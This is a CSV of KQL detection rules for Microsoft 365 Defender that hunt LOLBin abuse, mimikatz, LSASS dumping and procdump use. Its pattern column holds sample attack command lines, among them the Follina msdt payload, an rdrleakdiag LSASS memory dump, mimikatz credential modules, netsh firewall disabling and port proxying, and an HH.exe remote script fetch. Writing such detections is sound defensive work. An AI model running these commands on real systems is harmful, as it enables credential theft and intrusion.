,title,description,detectType,detectCon,detectLanguage,tags,attackTechnique,attackSoftware,references,pattern,dataSource,dataType,dataCollector,dataForwardTo,dataparser,dataParser,dataStorage,dataTable,dataIndex,dataAccess,dataMap,kqlVar,kqlTable,kqlQuery
164,mshta_pid_0001_executing_hta,['mshta executing HTA files'],,3,kql,['lolbin'],t1218.005,,,['mshta c:\\folderpath\\filename.hta'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
  and ProcessCommandLine contains '.hta'"
165,mshta_pid_0007_lethal_hta,['mshta spawned by svchost LethalHTA'],,3,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where InitiatingProcessFileName has 'svchost'"
166,mshta_pid_0009_rare_shell_spawn,"['mshta spawning cmd shell', 'maybe result of suspicious HTA']",,4,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessFileName has 'mshta'
  or InitiatingProcessVersionInfoOriginalFileName has 'mshta'
| where FileName has 'cmd'
"
167,mshta_pid_0003_executing_javascript,['mshta executing javascript files'],,2,kql,['lolbin'],t1218.005,,,"[""mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();""]",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'mshta'
  and ProcessCommandLine has 'javascript'
| where ProcessCommandLine contains 'GetObject'
  and ProcessCommandLine contains 'script'"
168,mshta_pid_0005_rare_parent,['mshta being spawned by a rare initiating/parent file'],,3,kql,['lolbin'],t1218.005,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mshta'
  or ProcessVersionInfoOriginalFileName has 'mshta'
| where InitiatingProcessFileName has 'cmd'
  or InitiatingProcessFileName has 'cscript'
  or InitiatingProcessFileName has 'wscript'
  or InitiatingProcessFileName has 'powershell'
  or InitiatingProcessFileName has 'pwsh'
  or InitiatingProcessFileName contains 'regsvr'
  or InitiatingProcessFileName contains 'rundll'"
169,msdt_pid_0002_fpcwdiag_executing_xml,['MSDT executing a xml file'],,2,kql,['lolbin'],t1218.003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'msdt'
  and ProcessCommandLine has 'PCWDiagnostic'
  and InitiatingProcessFileName !has 'pcwrun'
| where ProcessCommandLine contains '-af'
  and ProcessCommandLine contains '.xml'"
170,msdt_pid_0001_follina_rec_exploit,['MSDT Follina CVE-2022-30190'],,2,kql,"['lolbin', 'cve-2022-30190']",t1218.003,,,"['msdt /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'msdt'
  and ProcessCommandLine has 'PCWDiagnostic'
| where ProcessCommandLine contains 'IT_BrowseForFile='
  and ProcessCommandLine contains '../../'"
171,appinstaller_pid_0002_handler_invoked_network_conn.yaml,"['AppInstaller.exe is spawned by the default handler for the URI', 'it attempts to load/install a package from the URL and is saved in INetCache']",,4,kql,['lolbin'],t1105,,,,windows_os,['connection_all'],m365d_agent,m365d_security_center,,,m365d_security_center,device_network_events,,api_advanced_hunting,,,DeviceNetworkEvents,"| where InitiatingProcessFileName contains 'appinstaller'
| where RemoteUrl contains 'https:'
  or RemoteUrl contains 'http:'"
172,appinstaller_pid_0001_load_remote_package,"['AppInstaller.exe is spawned by the default handler for the URI', 'it attempts to load/install a package from the URL and is saved in INetCache']",,3,kql,['lolbin'],t1105,,,['appinstaller_pid_0001_invoke_network_connection.yaml'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'start'
  and ProcessCommandLine has 'appinstaller'
| where ProcessCommandLine contains 'ms-appinstaller'
| where ProcessCommandLine contains 'https:'
  or ProcessCommandLine contains 'http:'"
173,wuauclt_pid_0001_execute_dll,['wuauclt executing dll'],,2,kql,['lolbin'],,,,['wuauclt.exe /UpdateDeploymentProvider [Full_Path_To_DLL] /RunHandlerComServer'],windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'wuauclt'
  and ProcessCommandLine has 'RunHandlerComServer'
  and ProcessCommandLine has 'UpdateDeploymentProvider'
| where ProcessCommandLine contains '.dll'
| where ProcessCommandLine !contains 'UpdateDeploymentProvider.dll' 
  and ProcessCommandLine !contains 'UpdateDeploy.dll' 
  and ProcessCommandLine !contains 'wuaueng.dll'"
174,netsh_pid_0012_port_proxy,['netsh used to set up port forwarding port porxy'],,2,kql,['lolbin'],t1090.001,s0108,,['netsh interface portproxy add v4tov4 listenport=8001 listenaddress=<JUMP BOX IP> connectport=3389 connectaddress=<DESTINATION IP>'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'portproxy'
  and ProcessCommandLine has 'add'
  and ProcessCommandLine contains 'v4tov4'"
175,netsh_pid_0004_mod_firewall_rdp_enable,['netsh enables remote desktop feature on windows by modifying firewall rules'],,2,kql,['lolbin'],t1562.004,s0108,,"['netsh.exe advfirewall firewall set rule ""group=remote desktop"" new enable=Yes']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'rule'
| where ProcessCommandLine contains 'group='
  and ProcessCommandLine contains 'remote desktop'
  and ProcessCommandLine contains 'enable='
  and ProcessCommandLine contains 'yes'"
176,netsh_pid_0006_add_fw_rule,['add a local firewall rule name'],,5,kql,['lolbin'],t1562.004,s0108,,"['netsh.exe advfirewall firewall add rule ""name=allow RemoteDesktop"" dir=in * protocol=TCP localport=<port num> action=allow']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'add'
  and ProcessCommandLine has 'rule'"
177,netsh_pid_0003_file_rename,['netsh renamed'],,3,kql,['lolbin'],t1036.003,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
  and ProcessVersionInfoOriginalFileName !has 'netsh'
| where isnotempty(ProcessVersionInfoOriginalFileName)"
178,netsh_pid_0011_port_forwarding_rdp,['netsh used to set up port forwarding for rdp'],,2,kql,['lolbin'],t1090,s0108,,['netsh I p a v l=8001 listena=<JUMP BOX IP> connectp=3389 c=<DESTINATION IP>'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'listena'
  and ProcessCommandLine has 'connectp'
| where ProcessCommandLine contains 'c='
  and ProcessCommandLine contains '=3389'
| where ProcessCommandLine contains ' i '
  and ProcessCommandLine contains ' p '
  and ProcessCommandLine contains ' a '
  and ProcessCommandLine contains ' v '"
179,netsh_pid_0005_mod_firewall_smb_enable,['enables print file share feature (smb) on windows by modifying firewall rules'],,2,kql,['lolbin'],t1562.004,s0108,,"['netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'rule'
| where ProcessCommandLine contains 'group='
  and ProcessCommandLine contains 'file and printer sharing'
  and ProcessCommandLine contains 'enable='
  and ProcessCommandLine contains 'yes'"
180,netsh_pid_0002_disable_windows_firewall,['disable windows firewall'],,3,kql,['lolbin'],t1562.004,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'firewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'opmode'
| where ProcessCommandLine contains 'mode=disable'
  or ProcessCommandLine contains 'disable'"
181,netsh_pid_0001_set_firewall_profile_off,[None],,3,kql,['lolbin'],t1562.004,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'state'
  and ProcessCommandLine has 'off'
| where ProcessCommandLine contains 'allprofiles'
  or ProcessCommandLine contains 'Currentprofile' 
  or ProcessCommandLine contains 'Domainprofile'
  or ProcessCommandLine contains 'Privateprofile'
  or ProcessCommandLine contains 'Publciprofile'"
182,netsh_pid_0009_helper_dll,"['netsh used to register helper dll', 'persistence method']",,2,kql,['lolbin'],t546.007,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'add'
  and ProcessCommandLine has 'helper'"
183,netsh_pid_0010_port_forwarding,['netsh used to set up port forwarding'],,2,kql,['lolbin'],t1090,s0108,,['netsh I p a v l=8001 listena=127.0.0.1 connectp=80 c=192.168.1.1'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'listena'
  and ProcessCommandLine has 'connectp'
| where ProcessCommandLine contains 'c='
| where ProcessCommandLine contains ' i '
  and ProcessCommandLine contains ' p '
  and ProcessCommandLine contains ' a '
  and ProcessCommandLine contains ' v '"
184,netsh_pid_0008_show_fw_rules,['netsh used to list firewall rules'],,5,kql,['lolbin'],t1016,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'firewall'
  and ProcessCommandLine has 'show'
  and ProcessCommandLine has 'rule'"
185,netsh_pid_0006_add_fw_rule,['add a local firewall rule name'],,5,kql,['lolbin'],t1562.004,s0108,,"['netsh.exe advfirewall firewall add rule ""name=allow RemoteDesktop"" dir=in * protocol=TCP localport=<port num> action=allow']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'add'
  and ProcessCommandLine has 'rule'
| where ProcessCommandLine contains 'dir=in'
| where (ProcessCommandLine contains 'remote' 
        and ProcessCommandLine contains 'desktop' 
        and ProcessCommandLine contains 'name=')
    or (ProcessCommandLine contains 'localport=' and ProcessCommandLine contains '3389')"
186,mimikatz_pid_0008_vault,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'vault:': None}, 'vault::cred']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'vault'
| where ProcessCommandLine contains 'vault::'"
187,mimikatz_pid_0004_lsadump,"['mimikatz command indicator', 'refer to command documentation for further description']",,1,kql,,,s0002,,"[{'lsadump:': None}, 'lsadump::sam', 'lsadump::secrets', 'lsadump::trust', 'lsadump::zerologon', 'lsadump::dcsync']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'lsadump'
| where ProcessCommandLine contains 'lsadump::'"
188,mimikatz_pid_0005_privilege,"['mimikatz command indicator', 'This module provides some functionalities to manipulate privileges on mimikatz process']",,1,kql,,,s0002,,"[{'privilege:': None}, 'privilege::debug', 'privilege::security', 'privilege::name']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'privilege'
| where ProcessCommandLine contains 'privilege::'"
189,mimikatz_pid_0013_event,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'event:': None}, 'event::clear']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'event'
| where ProcessCommandLine contains 'event::'"
190,mimikatz_pid_0001_file_ioc,['mimikatz.exe file create or modified'],,1,kql,,,s0002,,['mimikatz'],windows_os,file_event,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,"| where FileName has 'mimikatz'
  or InitiatingProcessCommandLine has 'mimikatz'"
191,mimikatz_pid_0006_kerberos,"['mimikatz command indicator', 'can be used to forge tickets', 'see command documentation for more descriptions']",,1,kql,,t1558.001,s0002,,"[{'kerberos:': None}, 'kerberos::golden', 'kerberos::hash']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'kerberos'
| where ProcessCommandLine contains 'kerberos::'"
192,mimikatz_pid_0007_crypto,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'crypto:': None}, 'crypto::certificates', 'crypto::sc']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'crypto'
| where ProcessCommandLine contains 'crypto::'"
193,mimikatz_pid_0012_rpc,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'rpc:': None}, 'rpc::enum', 'rpc::server']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'rpc'
| where ProcessCommandLine contains 'rpc::'"
194,mimikatz_pid_0002_process_ioc,['mimikatz keyword identified in process creation'],,1,kql,,,s0002,,['mimikatz'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mimikatz'
  or ProcessVersionInfoOriginalFileName has 'mimikatz'
  or ProcessCommandLine has 'mimikatz'"
195,mimikatz_pid_0010_process,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'process:': None}, 'process::list']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'process'
| where ProcessCommandLine contains 'process::'"
196,mimikatz_pid_0011_misc,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'misc:': None}, 'misc::taskmgr', 'misc::shadowcopies']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'misc'
| where ProcessCommandLine contains 'misc::'"
197,mimikatz_pid_0003_sekurlsa,"['mimikatz command indicator', 'This modules is probably the most used one among Mimikatz users.', 'It retrieves clear text passwords, kerberos tickets, pin codes, etc', 'Creds from LSA Subsystem Service (LSASS)', 'Refer to command documention for further descriptions']",,1,kql,,t1003.001,s0002,,"[{'sekurlsa:': None}, 'sekurlsa::logonpasswords', 'sekurlsa::minidump']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'sekurlsa'
| where ProcessCommandLine contains 'sekurlsa::'"
198,mimikatz_pid_0009_dpapi,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'dpapi:': None}, 'dpapi::vault']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'dpapi'
| where ProcessCommandLine contains 'dpapi::'"
199,lsass_pid_0001_memory_read_not_system_acnt,['lsass read from a non system account'],,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and AccountName !~ 'system'"
200,lsass_pid_0004_large_memory_read_taskmgr,['20 mb LSASS memory read from taskmgr'],,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and InitiatingProcessFileName has 'taskmgr'
  and parse_json(AdditionalFields).TotalBytesCopied >= 20000000"
201,lsass_pid_0007_memdmp_rdrleakdiag,"['Powershell Get-Process LSASS', 'Dmp File Created']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']","['for /f ""tokens=2 delims= "" %J in (\'""tasklist /fi ""Imagename eq lsass.exe"" | find ""lsass""""\') do rdrleakdiag.exe -p %J -enable & sleep 1 & rdrleakdiag.exe -p %J -o c:\\users\\maximus\\desktop\\dumps -fullmemdmp -snap']",windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'rdrleakdiag'
  and ProcessCommandLine has 'lsass'
| where ProcessCommandLine contains 'fullmemdmp'
  or ProcessCommandLine contains 'minidump'
"
202,lsass_pid_0002_large_rare_memory_read,"['20 mb LSASS memory read from a rare process on a single system', 'Last 24 hours < 1 devices show this activity']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and parse_json(AdditionalFields).TotalBytesCopied >= 20000000
| summarize DeviceSet=make_set(DeviceName), arg_max(Timestamp, *) by InitiatingProcessFileName
| extend DeviceCount = array_length(DeviceSet)
| where DeviceCount <= 1"
203,lsass_pid_0005_dmp_file_created,"['LSASS.dmp File Created', 'Likely from Taskmgr']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,file_created,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,"| where ActionType =~ 'FileCreated'
  and FileName =~ 'lsass.dmp'"
204,lsass_pid_0003_large_memory_read_rundll,['20 mb LSASS memory read from rundll'],,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and InitiatingProcessFileName contains 'rundll'
  and parse_json(AdditionalFields).TotalBytesCopied >= 20000000"
205,lsass_pid_0006_dmp_file_created_pshell_get_process,"['Powershell Get-Process LSASS', 'Dmp File Created']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",,windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'powershell.exe'
  and ProcessCommandLine contains 'Get-Process'
  and ProcessCommandLine contains 'lsass'
"
206,hh_pid_0002_executing_chm,['open .CHM compiled HTML files with HH.exe HTML help'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains '.chm'"
207,hh_pid_0003_executing_remote_file,['HTML help executing remote file'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains 'http://'
  or ProcessCommandLine contains 'https://'"
208,hh_pid_0005_parent_powershell,['HTML help called by powershell'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessVersionInfoOriginalFileName has 'powershell'
  and FileName =~ 'hh.exe'"
209,hh_pid_0004_decompiling_file,['HTML help decompiling file'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains '-decompile'"
210,hh_pid_0001_executing_ps1,['open powershell script with HTML help'],,3,kql,['lolbin'],t1218.001,,,['HH.exe http://some.url/script.ps1'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains '.ps1'"
211,dumpert_pid_0001_direct_api_call,['Dump Creds from memory'],,1,kql,,t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'dumpert'
  or FileName has 'dumpert'"
212,mavinject_pid_0001_inject_dll,['MAVINJECT injecting arbitrary dll file'],,3,kql,['lolbin'],t1218.003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mavinject'
  and InitiatingProcessFileName !~ 'appvclient.exe'
| where ProcessCommandLine contains '/INJECTRUNNING'
  or InitiatingProcessCommandLine contains '/INJECTRUNNING'
| where ProcessCommandLine contains '.dll'"
213,keymgr_pid_0001_cred_dump,['rundll32 using key manager to dump creds'],,2,kql,['lolbin'],t1003,,,"['rundll32.exe keymgr,KRShowKeyMgr']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'keymgr' 
  and ProcessCommandLine has 'krshowkeymgr'
| where ProcessCommandLine contains 'rundll'"
214,appcmd_pid_0001_list_config,['List service account credentials from app pools on a server'],,1,kql,['lol'],['t1003'],,,,windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'appcmd.exe'
  and ProcessCommandLine contains 'list'
  and ProcessCommandLine contains 'apppool'
| where ProcessCommandLine contains @'/config'
"
215,appcmd_pid_0001_list_svc_acnt_creds,['List service account credentials from app pools on a server'],,1,kql,['lol'],['t1003'],,,,windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'appcmd.exe'
  and ProcessCommandLine contains 'list'
  and ProcessCommandLine contains 'apppool'
| where ProcessCommandLine contains @'/@t:*'
  and ProcessCommandLine contains @'/@text:*'
  and ProcessCommandLine contains @'/text:*'
"
216,infdefualtinstall_pid_0001_executing_inf,['infdefaultinstall used to execute .inf file'],,3,kql,['lolbin'],t1218,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'InfDefaultInstall'
| where ProcessCommandLine contains '.inf'"
217,procdump_pid_0003_fulldump_flag,['procdump creating fulldump of a process'],,3,kql,['sysinternals'],t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
  and ProcessCommandLine contains '-ma'"
218,procdump_pid_0005_dump_flag,['procdump creating fulldump of lsass process'],,3,kql,['sysinternals'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
| where ProcessCommandLine contains '-ma'
  or ProcessCommandLine contains '-mm'
  or ProcessCommandLine contains '-mt'
  or ProcessCommandLine contains '-mp'
  or ProcessCommandLine contains '-mc'
  or ProcessCommandLine contains '-md'
  or ProcessCommandLine contains '-mk'"
219,procdump_pid_0001_minidump_flag,['procdump creating minidump of a process'],,3,kql,['sysinternals'],t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
  and ProcessCommandLine contains '-mm'"
220,procdump_pid_0002_minidump_lsass,['procdump creating minidump of lsass'],,1,kql,['sysinternals'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
  and ProcessCommandLine contains '-mm'
  and ProcessCommandLine contains 'lsass'"
